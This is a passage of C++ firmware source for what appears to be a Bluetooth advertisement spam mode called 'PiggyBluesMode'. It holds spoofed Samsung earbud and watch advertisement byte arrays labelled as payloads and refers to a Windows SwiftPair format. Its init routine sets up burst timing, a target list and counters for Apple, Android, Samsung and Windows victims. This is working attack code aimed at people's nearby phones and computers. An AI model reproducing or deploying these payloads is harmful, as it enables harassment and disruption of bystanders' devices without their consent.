450|static const uint8_t SAMSUNG_WATCH6[] = {0x15, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x04, 0xff, 0x00, 0x00, 0x43, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
451|
452|static const uint8_t* SAMSUNG_PAYLOADS[] = {
453|    SAMSUNG_BUDS_PRO, SAMSUNG_BUDS_LIVE, SAMSUNG_BUDS_FE, SAMSUNG_BUDS2,
454|    SAMSUNG_BUDS2_PRO, SAMSUNG_BUDS_PLUS, SAMSUNG_WATCH4, SAMSUNG_WATCH5,
455|    SAMSUNG_WATCH5_PRO, SAMSUNG_WATCH6
456|};
457|static const size_t SAMSUNG_PAYLOAD_COUNT = sizeof(SAMSUNG_PAYLOADS) / sizeof(SAMSUNG_PAYLOADS[0]);
458|
459|// Windows SwiftPair format
460|// Uses Microsoft vendor ID 0x0006 with SwiftPair service data
461|
462|// BLE advertising state
463|static NimBLEAdvertising* pAdvertising = nullptr;
464|
465|// Update timing state
466|static uint32_t advertisingStartTime = 0;
467|static uint32_t lastMoodUpdateTime = 0;
468|
469|// Last target info for mood display
470|static BLEVendor lastVendorUsed = BLEVendor::UNKNOWN;
471|static int8_t lastRssiUsed = 0;
472|
473|void PiggyBluesMode::init() {
474|    running = false;
475|    confirmed = false;
476|    lastBurstTime = 0;
477|    setScanRunning(false);
478|    setAdvertisingNow(false);
479|    
480|    // Load config values
481|    cfgBurstInterval = Config::ble().burstInterval;
482|    cfgAdvDuration = Config::ble().advDuration;
483|    
484|    // Validate: advDuration must not exceed burstInterval (prevents perpetual lag)
485|    if (cfgAdvDuration > cfgBurstInterval) {
486|        cfgAdvDuration = cfgBurstInterval;
487|    }
488|    
489|    burstInterval = cfgBurstInterval;
490|    targets.clear();
491|    targets.reserve(MAX_TARGETS);
492|    activeCount = 0;
493|    totalPackets = 0;
494|    appleCount = 0;
495|    androidCount = 0;
496|    samsungCount = 0;
497|    windowsCount = 0;
498|    
499|    // Reset deferred target state
500|    pendingTargetAdd = false;
501|